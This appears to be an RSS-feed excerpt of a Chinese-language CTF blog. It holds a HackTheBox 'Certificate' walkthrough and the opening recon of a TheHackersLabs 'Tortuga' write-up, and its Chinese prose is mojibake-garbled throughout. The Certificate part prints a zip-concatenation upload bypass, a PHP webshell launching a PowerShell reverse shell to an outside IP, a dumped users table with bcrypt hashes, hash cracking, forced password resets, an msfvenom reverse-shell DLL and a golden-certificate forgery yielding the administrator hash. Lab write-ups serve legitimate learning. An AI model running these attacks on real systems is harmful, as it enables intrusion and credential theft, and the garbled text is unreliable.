    å°†ä»»åŠ¡æ–‡ä»¶åŒ…å«åœ¨å­˜æ¡£æ–‡ä»¶ä¸­`.zip`ä»¥å‡å°å…¶å¤§å°
    

ç»è¿‡æµ‹è¯•ï¼Œå¯ä»¥ç›´æ¥ä¸Šä¼ `PDF`æ–‡ä»¶ï¼Œå¹¶ä¸”ä¼šæ£€æŸ¥æ–‡ä»¶å¤´ã€‚ä¹Ÿå¯ä»¥å°†`pdf`ä»¥`zip`æ ¼å¼å‹ç¼©ï¼Œç„¶åä¸Šä¼ ï¼ˆè¿™é‡Œä¸èƒ½ä½¿ç”¨`bindzip`ï¼‰ï¼Œä¸Šä¼ `zip`æ–‡ä»¶ä¹‹åä¼šè‡ªåŠ¨è¿›è¡Œè§£å‹ã€‚

è¿™é‡Œå¯¹ä¸Šä¼ åŠŸèƒ½ç‚¹è¿›è¡Œäº†å¸¸è§„çš„æµ‹è¯•ï¼Œä¾‹å¦‚ä¿®æ”¹æ–‡ä»¶åç¼€åç­‰ç­‰ï¼Œä½†æ˜¯æ— æ³•æˆåŠŸã€‚

é€šè¿‡ç½‘ç»œæœç´¢ï¼Œå‘ç°è¿˜å¯èƒ½å­˜åœ¨ `ZipSlip` æ¼æ´

> https://medium.com/@ibm_ptc_security/zip-slip-attack-e3e63a13413f
> 

èƒ½è¾¾åˆ°`RCE`çš„æ•ˆæœï¼Œå¯ä»¥è¦†ç›– `/etc/passwd` æ–‡ä»¶æˆ–è€…å…¬é’¥æ–‡ä»¶æˆ–è€…å…¶ä»–æ–‡ä»¶

> ä¸€äº›åˆ©ç”¨äº†`ZipSlip`çš„CTFï¼šhttps://starlox.medium.com/cyberspace2024-zipzone-ctf-zipslip-vulnerability-00489669feec
> 

æˆ‘è¿™é‡Œå°è¯•äº†

```bash
âœ  Certificate tree zip 
zip
â”œâ”€â”€ 1.pdf
â””â”€â”€ evil
    â””â”€â”€ test.php

âœ  Certificate zip 2.zip zip/*
  adding: zip/1.pdf (deflated 7%)
  adding: zip/evil/ (stored 0%)
```

ç„¶åä¸Šä¼ `2.zip` ï¼Œä½†æ˜¯é¡µé¢ä¸å›æ˜¾ï¼Œæ— æ³•å¾—åˆ°ä¸Šä¼ åçš„æ–‡ä»¶å¤¹è·¯å¾„

> åˆ«äººåˆ†äº«çš„ä¸€ä¸ªé“¾æ¥ï¼šhttps://perception-point.io/blog/evasive-concatenated-zip-trojan-targets-windows-users/ï¼Œå…¶ä¸­çš„ **Chained Archives Explained: Concatenated ZIPs**Â å¯èƒ½å¯¹æˆ‘ä»¬æœ‰æ•ˆ
> 

```bash
âœ  Certificate ls               
1.pdf  evil

âœ  Certificate ls evil   
test.php

âœ  Certificate zip -r 1.zip evil
  adding: evil/ (stored 0%)
  adding: evil/test.php (stored 0%)
  
âœ  Certificate zip 2.zip 1.pdf  
  adding: 1.pdf (deflated 7%)
  
âœ  Certificate cat 1.zip 2.zip > 3.zip  ï¼ˆæ— æ³•ä¸Šä¼ ï¼‰

âœ  Certificate cat 2.zip 1.zip > 3.zip  ï¼ˆæˆåŠŸä¸Šä¼ ï¼‰
```

ç‚¹å‡»è®¿é—®ï¼Œå¹¶è¾“å…¥ `evil/test.php` æˆåŠŸæ‰§è¡Œï¼ï¼

![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image4.png)

ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬

```bash
<?php shell_exec("powershell -nop -w hidden -c \"\$client = New-Object System.Net.Sockets.TCPClient('10.10.16.43',4444); \$stream = \$client.GetStream(); [byte[]]\$bytes = 0..65535|%{0}; while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){; \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i); \$sendback = (iex \$data 2>&1 | Out-String ); \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> '; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length); \$stream.Flush()}; \$client.Close()\"");?>
```

PSï¼šè¿™é‡Œå‡å¦‚æ–­å¼€äº†ï¼Œä¸‹æ¬¡å†è¿æ¥æ˜¯ä½¿ç”¨æ–°çš„ç«¯å£æ¥æ”¶ shell

```bash
malicious_files/shell.php
```

![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image5.png)

## Mysql Dump

æˆ‘ä»¬æ‰«æç›®å½•çš„æ—¶å€™èƒ½çœ‹åˆ°å­˜åœ¨`db.php` ,æˆ‘ä»¬å°†å…¶è¯»å–

```bash
<?php
// Database connection using PDO
try {
    $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
    $db_user = 'certificate_webapp_user'; // Change to your DB username
    $db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password
    $options = [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ];
    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
} catch (PDOException $e) {
    die('Database connection failed: ' . $e->getMessage());
}
?>
```

è¯»å–æ•°æ®åº“çš„æ•°æ®

```bash
PS C:\xampp\mysql\bin> & "C:\xampp\mysql\bin\mysql.exe" -u certificate_webapp_user -p"cert!f!c@teDBPWD" -D Certificate_WEBAPP_DB -e "show tables;"
Tables_in_certificate_webapp_db
course_sessions
courses
users
users_courses
```

```bash
PS C:\xampp\mysql\bin> & "C:\xampp\mysql\bin\mysql.exe" -u certificate_webapp_user -p"cert!f!c@teDBPWD" -D Certificate_WEBAPP_DB -e "select * from users;"
id      first_name      last_name       username        email   password        created_at      role    is_active
1       Lorra   Armessa Lorra.AAA       lorra.aaa@certificate.htb       $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG    2024-12-23 12:43:10     teacher 1
6       Sara    Laracrof        Sara1200        sara1200@gmail.com      $2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK    2024-12-23 12:47:11     teacher 1
7       John    Wood    Johney  johny009@mail.com       $2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq    2024-12-23 13:18:18     student 1
8       Havok   Watterson       havokww havokww@hotmail.com     $2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti    2024-12-24 09:08:04     teacher 1
9       Steven  Roman   stev    steven@yahoo.com        $2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2    2024-12-24 12:05:05     student 1
10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1
12      sunset  sunset  sunset  1@q.xom $2y$04$46hjL/TUPqsT3KI7R/6tje1JOSy5.riL8ABfus1G8WZujELAgnQvy    2025-06-01 16:49:22     student 1
13      r       r       admin   t@t.com $2y$04$ui6Qc/eaGGRKK2ovA4iJne7qbd1uSkm5lVbEHnPWWKYYwzb2s0hY2    2025-06-01 16:49:28     student 1
14      sunset2 sunset2 sunset2 1@qq.com        $2y$04$F5Rr9QzbhhaEh7QhJKKwz.ClZdVaA9QPI9RBdy8v.G/Pc7TDAO196    2025-06-01 16:57:14     student 1
16      admin123        admin123        admin123        admin123@gmail.com      $2y$04$ViY8NzbVBvUlwppQcDrld.mh.1XcGQkc4lt6j5Uhj7IPyGq4Z0hQu    2025-06-01 16:59:02     student 1
17      Admin   Admin   adminsucks      admin@gmail.com $2y$04$FMa5TpAFpTDu5EwgVzybnuAJFryR18dzfSqZGLQFzHhqj/BwksTdy    2025-06-01 17:12:43     student 1
18      admin   adnim   adminadnim      admin@adnim.com $2y$04$x.Ak4KXkM.MLNA0JgCEPxevbFuBioVs5NONlqrw.eO2js1/5AQh8i    2025-06-01 17:14:15     teacher 0
19      1       2       3       test@test.com   $2y$04$dFR.yVKC/u9UwlPsyxa5fO11vPvZnFUhRxi2Uf25SoGQRaTE6SmBW    2025-06-01 17:16:12     teacher 0
20      test2   test2   test2   test2@test.com  $2y$04$Ci4wfETizE9WCrUgpC4tyuI7s4oLIpK/DWb/uhjO2IKTRIfD9JUGy    2025-06-01 17:17:40     teacher 0
22      test3   test3   test3   test3@test.com  $2y$04$m51Lz73GtqPoAzovxJeCM.B8/SAkDERIl7OBZfxAAQahNpiVFPsKe    2025-06-01 17:34:30     student 1
```

![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image6.png)

å…¶ä¸­æˆ‘ä»¬æ„Ÿå…´è¶£çš„ç”¨æˆ·æœ‰ä¸¤æ¡

```bash
10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1
1       Lorra   Armessa Lorra.AAA       lorra.aaa@certificate.htb       $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG    2024-12-23 12:43:10     teacher 1
```

å¯¹å¯†ç è¿›è¡Œçˆ†ç ´

```bash
âœ  Certificate john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash  
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 16 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Blink182         (?)   
```

çˆ†ç ´äº†å¥½ä¸€ä¼šå°†`sara.b` çš„å¯†ç çˆ†ç ´å‡ºæ¥äº†

æµ‹è¯•ç”¨æˆ·æœ‰æ•ˆæ€§

```bash
âœ  Certificate nxc smb 10.10.11.71 -u sara.b -p Blink182 -d certificate.htb
SMB         10.10.11.71     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.71     445    DC01             [+] certificate.htb\sara.b:Blink182
```

## åŸŸåˆ†æ

`bloodhound-python` æœé›†ä¿¡æ¯

```bash
âœ  Certificate bloodhound-python -u 'sara.b' -p 'Blink182' -d 'certificate.htb' -ns 10.10.11.71 --zip -c All -dc 'DC01.certificate.HTB'
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: certificate.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: DC01.certificate.HTB
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: DC01.certificate.HTB
INFO: Found 19 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WS-05.certificate.htb
INFO: Querying computer: WS-01.certificate.htb
INFO: Done in 00M 20S
INFO: Compressing output into 20250602223438_bloodhound.zip
```

å‘ç°ç”¨æˆ· `sara.b` æ˜¯å±äº `REMOTE MANAGEMENT USERS`ç»„çš„

![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image7.png)

å¹¶ä¸”æ˜¯ `Account Operators`ç»„çš„ç”¨æˆ·

![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image8.png)

é‚£å°±æ˜¯å¯ä»¥æ›´æ”¹ç”¨æˆ·çš„å¯†ç ã€åˆ›å»ºç”¨æˆ·ç»„ç­‰ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥ä¿®æ”¹ `admins` ç»„ç”¨æˆ·çš„å¯†ç 

æŸ¥çœ‹ä¸€ä¸‹ `Domain Admins` ç»„ï¼Œåªæœ‰ `administrator` ç”¨æˆ·ä¸€ä¸ªï¼Œæ•…æ— æ³•ç›´æ¥è·å¾—åŸŸæƒé™

![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image9.png)

å…ˆä½¿ç”¨ `sara.b` ç™»å½•åˆ° `DC` è¿›è¡Œä¿¡æ¯æ”¶é›†

```bash
âœ  Certificate evil-winrm -i 10.10.11.71 -u 'sara.b' -p 'Blink182' 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Sara.B\Documents> 
```

æŸ¥çœ‹`users` æ–‡ä»¶å¤¹ï¼Œæœ‰å¥½å‡ ä¸ªç”¨æˆ·ï¼Œå…ˆåšå¥½æ‰“ç®—æ¨ªå‘åˆ°å“ªä¸€ä¸ªç”¨æˆ·

```bash
*Evil-WinRM* PS C:\Users> ls

    Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/30/2024   8:33 PM                Administrator
d-----       11/23/2024   6:59 PM                akeder.kh
d-----        11/4/2024  12:55 AM                Lion.SK
d-r---        11/3/2024   1:05 AM                Public
d-----        11/3/2024   7:26 PM                Ryan.K
d-----         6/2/2025   8:17 AM                saad.m
d-----       11/26/2024   4:12 PM                Sara.B
d-----       12/29/2024   5:30 PM                xamppuser
```

å…¶ä¸­æœ€ä»¤äººæ„Ÿå…´è¶£çš„æ˜¯ `LION.SK` å’Œ `RYAN.K`

`LION.SK` å±äº`DOMAIN CRA MANAGERS` è¯¥ç»„è§£é‡Šæ˜¯ï¼šè¯¥å®‰å…¨ç»„çš„æˆå‘˜è´Ÿè´£ä¸ºåŸŸç”¨æˆ·å‘è¡Œå’Œæ’¤é”€å¤šä¸ªè¯ä¹¦

![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image10.png)

`RYAN.K` å±äº `DOMAIN STORAGE MANAGERS` æ”¹ç»„è§£é‡Šæ˜¯ï¼šè¯¥å®‰å…¨ç»„çš„æˆå‘˜è´Ÿè´£é‡çº§ä»»åŠ¡ï¼Œä¾‹å¦‚ç»´æŠ¤ï¼Œç¢ç‰‡éƒ¨å’Œç®¡ç†åˆ†åŒºå’Œç£ç›˜

![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image11.png)

æŸ¥çœ‹ä¸€ä¸‹ä¿©ç”¨æˆ·æƒé™

æ›´æ”¹ç”¨æˆ·`LION.SK` çš„å¯†ç 

```bash
âœ  Certificate bloodyAD -d certificate.htb -u 'sara.b' -p 'Blink182' --dc-ip 10.10.11.71 set password LION.SK 'Password123!!!'
[+] Password changed successfully!
```

åœ¨ `LION.SK` ç”¨æˆ·å®¶ç›®å½•ä¸­èƒ½å¾—åˆ° `user.txt`

```bash
*Evil-WinRM* PS C:\Users\Lion.SK\Desktop> type user.txt
4c634600c2be9138b12e74ac6f288176
```

æšä¸¾ç”¨æˆ·æƒé™

```bash
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

æ›´æ”¹ç”¨æˆ·`RYAN.K` çš„å¯†ç 

```bash
âœ  Certificate bloodyAD -d certificate.htb -u 'sara.b' -p 'Blink182' --dc-ip 10.10.11.71 set password RYAN.K 'Password123!!!'
[+] Password changed successfully!
```

```bash
âœ  Certificate evil-winrm -i 10.10.11.71 -u 'RYAN.K' -p 'Password123!!!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> 
```

å‘ç° `RYAN.K` ç”¨æˆ·æœ‰ `SeManageVolumePrivilege` æƒé™

```bash
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State
============================= ================================ =======
SeMachineAccountPrivilege     Add workstations to domain       Enabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled
```

## SeManageVolumePrivilege æ»¥ç”¨

> æ‰¾åˆ°ä¸€äº›åˆ©ç”¨æ–‡æ¡£å’ŒPOCï¼šhttps://github.com/CsEnox/SeManageVolumeExploit | https://cn-sec.com/archives/3100947.html
> 

æ”¹æƒé™å¤§è‡´æ˜¯è®©æˆ‘ä»¬èƒ½æ‹¥æœ‰å†™å…¥ `C` ç›˜çš„æƒé™

```bash
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> echo '1' > ../../../1.txt
Access to the path 'C:\1.txt' is denied.
At line:1 char:1
+ echo '1' > ../../../1.txt
+ ~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (:) [Out-File], UnauthorizedAccessException
    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
```

```bash
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> upload SeManageVolumeExploit.exe
                                        
Info: Uploading /root/Desktop/HackTheBox/Certificate/SeManageVolumeExploit.exe to C:\Users\Ryan.K\Documents\SeManageVolumeExploit.exe
                                        
Data: 16384 bytes of 16384 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> ./SeManageVolumeExploit.exe
Entries changed: 859

DONE
```

æˆåŠŸå†™å…¥ `C` ç›˜

```bash
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> echo '1' > ../../../1.txt
```

### DLL hijackï¼Ÿ

`POC`é“¾æ¥ä¸­çš„`DLL`åŠ«æŒæ— æ³•ä½¿ç”¨ï¼Œå› ä¸ºæ²¡æœ‰å­˜åœ¨ `spool` æ–‡ä»¶å¤¹

```bash
*Evil-WinRM* PS C:\windows\system32> cmd /c dir | findstr spoo
11/26/2024  07:02 PM            93,184 spoolss.dll
11/26/2024  07:03 PM           564,224 winspool.drv
```

ä½†æ˜¯å¯ä»¥åŠ«æŒåˆ«çš„`DLL` 

> https://github.com/xct/SeManageVolumeAbuse
> 

è¿™é‡Œæœ‰åˆ«çš„`DLL`åŠ«æŒæ–¹æ³•ï¼ŒåŒæ—¶ç³»ç»Ÿä¹Ÿå­˜åœ¨è¯¥`DLL`

```bash
*Evil-WinRM* PS C:\windows\system32\wbem> cmd /c dir | findstr tzres
06/02/2025  09:33 AM             9,216 tzres.dll
```

```bash
âœ  Certificate msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.45 LPORT=1234 -f dll -o tzres.dll 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: tzres.dll
```

ä½†æ˜¯æœ€å `systeminfo` `Access is denied`

```bash
*Evil-WinRM* PS C:\windows\system32\wbem> systeminfo
Program 'systeminfo.exe' failed to run: Access is deniedAt line:1 char:1
+ systeminfo
+ ~~~~~~~~~~.
At line:1 char:1
+ systeminfo
+ ~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```

### CA.pfx

ä½¬ä»¬ç»™å‡ºäº†å¦å¤–ä¸€ä¸ªæ–¹æ¡ˆï¼Œæ‹¥æœ‰`SeManageVolumePrivilege` æƒé™åå¯ä»¥é€šè¿‡`certuil` æ¥å¯¼å‡ºè¯ä¹¦

æšä¸¾`CA`

```bash
âœ  Certificate certipy-ad find -u sara.b -p 'Blink182' -dc-ip 10.10.11.71 -text
```

![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image12.png)

å¯¼å‡º`CA`çš„è¯ä¹¦

```bash
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> certutil -exportPFX my "Certificate-LTD-CA" C:\Users\Public\ca.pfx
my "Personal"
================ Certificate 2 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft Software Key Storage Provider
Signature test passed
Enter new password for output file C:\Users\Public\ca.pfx:
Enter new password:
Confirm new password:
CertUtil: -exportPFX command completed successfully.
```

```bash
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> download ../../Public/ca.pfx
                                        
Info: Downloading C:\Users\Ryan.K\Documents\../../Public/ca.pfx to ca.pfx
                                        
Info: Download successful!
```

- CertUtil ä¼šæ‰“å¼€â€œmyâ€è¯ä¹¦å­˜å‚¨ï¼ˆPersonal/Myï¼‰ï¼Œæ‰¾åˆ°**ä¸»é¢˜åç§° (Subject Name / Issued To)** æˆ–**å‹å¥½åç§° (Friendly Name)**ä¸ºâ€œ`Certificate-LTD-CA`â€çš„é‚£å¼ è¯ä¹¦
- ç„¶åæŠŠè¿™å¼ è¯ä¹¦åŠå…¶ç§é’¥ï¼ˆä»¥åŠå¯èƒ½çš„è¯ä¹¦é“¾ï¼‰æ‰“åŒ…æˆä¸€ä¸ª PFX æ–‡ä»¶
- æœ€ç»ˆä¼šåœ¨ `C:\Users\Public\ca.pfx` ä½ç½®ç”Ÿæˆä¸€ä¸ªäºŒè¿›åˆ¶çš„ PFX æ–‡ä»¶

### Golden certificate

æ‹¿åˆ° `ca.pfx` çš„è¯ä¹¦å…¬ç§é’¥åå¯ä»¥è¿›è¡Œé»„é‡‘è¯ä¹¦ï¼ˆGolden certificateï¼‰æ”»å‡»

> https://www.thehacker.recipes/ad/persistence/adcs/golden-certificate
> 

ä¼ªé€ `administrator` çš„è¯ä¹¦

```bash
âœ  Certificate certipy-ad forge -ca-pfx ca.pfx -upn administrator@certificate.htb -subject 'CN=Administrator,CN=Users,DC=certificate,DC=htb' -out administrator_forge.pfx
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Saving forged certificate and private key to 'administrator_forge.pfx'
[*] Wrote forged certificate and private key to 'administrator_forge.pfx'
```

ä½¿ç”¨è¯ä¹¦è·å–`TGT`

```bash
âœ  Certificate certipy-ad auth -pfx administrator_forge.pfx -dc-ip 10.10.11.71 -domain certificate.htb -username administrator
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@certificate.htb'
[*] Using principal: 'administrator@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
```

`root.txt`

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
7d69ba1c8bb2ee23ff27f0e1610caa3b
```

## æ€»ç»“

ä»»é‡é“è¿œï¼Œä¸ä¼šçš„è¿˜æ˜¯å¤šâ€¦æ¯”å¦‚åˆ©ç”¨`certutil`æ¥å¯¼å‡ºè¯ä¹¦è¿™ä¸€ç‚¹ï¼Œä»¥åŠæ–‡ä»¶ä¸Šä¼ çš„`ZipSlip` ï¼Œæ€»çš„ä¹Ÿæ˜¯å­¦ä¹ åˆ°äº†æ–°ä¸œè¥¿]]></content:encoded>
            <category>é¶æœº</category>
            <category>HackTheBox</category>
            <category>Windows</category>
            <category>ADCS</category>
            <category>GoldenCertificate</category>
            <category>seManageVolumePrivilegem</category>
            <category>ZipSlip</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - Tortuga]]></title>
            <link>https://www.sunsetaction.top/2025/10/01/TheHackersLabsTortuga</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/10/01/TheHackersLabsTortuga</guid>
            <pubDate>Wed, 01 Oct 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Tortuga https://labs.thehackerslabs.com/machine/131 Recon PortScan æšä¸¾ HTTP é¡µé¢ä¸­çš„ä¸¤ä¸ªé“¾æ¥ â€œgrumete æ£€æŸ¥èˆ¹èˆ±é‡Œçš„éšè—çº¸æ¡â€œ æ„Ÿè§‰æ˜¯ä¸€ä¸ªç›®å½•æˆ–è€…ç”¨æˆ· ç›®å½•æ‰«ææ— ç»“æœ è¿›è¡Œ ssh çˆ†ç ´ å¾—åˆ°å¯†ç  1234 è¿›å»åèƒ½è¯»...]]></description>
            <content:encoded><![CDATA[
# Tortuga

> https://labs.thehackerslabs.com/machine/131
> 

![image.png](/post-images/TheHackersLabsTortuga/image.png)

## Recon

### PortScan

```bash
âœ  Tortuga nmap -sT -min-rate 10000 -p- 192.168.56.120
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-01 16:50 CST
Nmap scan report for 192.168.56.120
Host is up (0.00076s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:FE:83:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 3.92 seconds
```

```bash
âœ  Tortuga nmap -sT -A -p 22,80 192.168.56.120                                            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-01 16:51 CST
Nmap scan report for 192.168.56.120
Host is up (0.00040s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 bd:bc:74:bc:a6:ab:09:29:2d:88:42:16:91:93:b1:a4 (ECDSA)
|_  256 3b:99:fe:7e:ab:ae:b3:a7:05:b2:d1:73:08:6e:e7:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Isla Tortuga
MAC Address: 08:00:27:FE:83:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.40 ms 192.168.56.120

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.53 seconds
```

### æšä¸¾

HTTP

![image.png](/post-images/TheHackersLabsTortuga/image1.png)

é¡µé¢ä¸­çš„ä¸¤ä¸ªé“¾æ¥

```bash
La TripulaciÃ³n de Tortuga æµ·é¾Ÿèˆ¹å‘˜

    CapitÃ¡n Barbanegra â€“ Estratega implacable. é»‘èƒ¡å­èˆ¹é•¿ â€“ æ— æƒ…çš„æˆ˜ç•¥å®¶ã€‚
    Corsario Rojo â€“ Maestro de la espada.
    çº¢è‰²æµ·ç›—èˆ¹ â€“ å‰‘ä¹‹å¤§å¸ˆã€‚
    Grumete Verde â€“ Aprendiz despistado. ç»¿è‰²å°å±‹ç”·å­© â€“ å¿ƒä¸åœ¨ç„‰çš„å­¦å¾’ã€‚
    TimÃ³n de Hierro â€“ El que nunca pierde el rumbo.
    é“èˆµâ€”â€”æ°¸ä¸è¿·è·¯çš„äººã€‚

"Quien domine el timÃ³n hallarÃ¡ el rumbo a la victoria..."
â€œè°ä¸»å®°èˆµï¼Œè°å°±ä¼šæ‰¾åˆ°èƒœåˆ©ä¹‹è·¯......â€

"Recuerda: el viejo truco de las rutas dobles siempre funciona..."
â€œè®°ä½ï¼šåŒè·¯çº¿çš„è€æŠŠæˆæ€»æ˜¯æœ‰æ•ˆçš„......â€
```

```bash
Mapa de Isla Tortuga æ‰˜å°”å›¾åŠ å²›åœ°å›¾

~~~~~~~~~~~~~~~~~~~
~     PIRATE BAY   ~
~~~~~~~~~~~~~~~~~~~
       |   |
       |   |    X  (tesoro enterrado)
       |   |
~~~~~~~~~~~~~~~~~~~
~     PUERTO       ~
~~~~~~~~~~~~~~~~~~~
    

Una nota arrugada se lee en la esquina del mapa...
åœ°å›¾çš„è§’è½é‡Œå†™ç€ä¸€å¼ çš±å·´å·´çš„çº¸æ¡......

"Ey grumete revisa la nota oculta que dejado en tu camarote..."
â€œå˜¿ï¼Œèˆ¹èˆ±ç”·å­©ï¼Œæ£€æŸ¥ä¸€ä¸‹æˆ‘ç•™åœ¨ä½ èˆ¹èˆ±é‡Œçš„éšè—çº¸æ¡......â€
```

â€œ`grumete` æ£€æŸ¥èˆ¹èˆ±é‡Œçš„éšè—çº¸æ¡â€œ æ„Ÿè§‰æ˜¯ä¸€ä¸ªç›®å½•æˆ–è€…ç”¨æˆ·

ç›®å½•æ‰«ææ— ç»“æœ

```bash
âœ  Tortuga gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip -u http://192.168.56.120/grumete
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
